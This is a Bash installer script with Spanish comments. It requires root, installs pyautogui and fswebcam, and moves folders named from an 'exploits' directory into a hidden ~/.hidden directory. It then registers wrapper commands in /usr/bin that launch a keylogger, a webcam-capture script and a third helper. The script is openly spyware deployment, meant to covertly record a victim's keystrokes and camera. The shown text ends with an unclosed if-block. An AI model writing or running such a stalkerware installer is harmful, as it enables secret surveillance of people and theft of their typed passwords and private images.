root_verify=$(whoami)
usuario=$(users)

function init_program() {
    # Paquetes requeridos
    python3.7 -m pip install pyautogui
    sudo apt-get install fswebcam

    # Instalacion
    sudo touch /usr/bin/observer.sh
    sudo touch /usr/bin/chisec.sh
    sudo touch /usr/bin/fingerstalker.sh
    sudo echo "python3.7 /home/$usuario/.hidden/0v53rber/cam_snap.py" > /usr/bin/observer.sh
    sudo echo "python3.7 /home/$usuario/.hidden/ch1s3c/hb.py" > /usr/bin/chisec.sh
    sudo echo "python3.7 /home/$usuario/.hidden/f1ng3r5talk3r/keylogger.py" > /usr/bin/fingerstalker.sh
    sudo chmod +x /usr/bin/observer.sh
    sudo chmod +x /usr/bin/chisec.sh
    sudo chmod +x /usr/bin/fingerstalker.sh

    # Carpetas
    mkdir .hidden
    mv -r exploits/0v53rber/ .hidden
    mv -r exploits/ch1sec/ .hidden
    mv -r exploits/f1ng3r5talk3r/ .hidden

    echo -e "En otra terminal pega el siguiente comando : python3.7 /home/$usuario/v1k0x/add.py"

    echo -e "[+] Instalacion completada con exito. "
}
if [ $root_verify != "root" ]
then
    echo -e "[!] Debes ejecutar el instalador como root (super-usuario)"
else
    init_program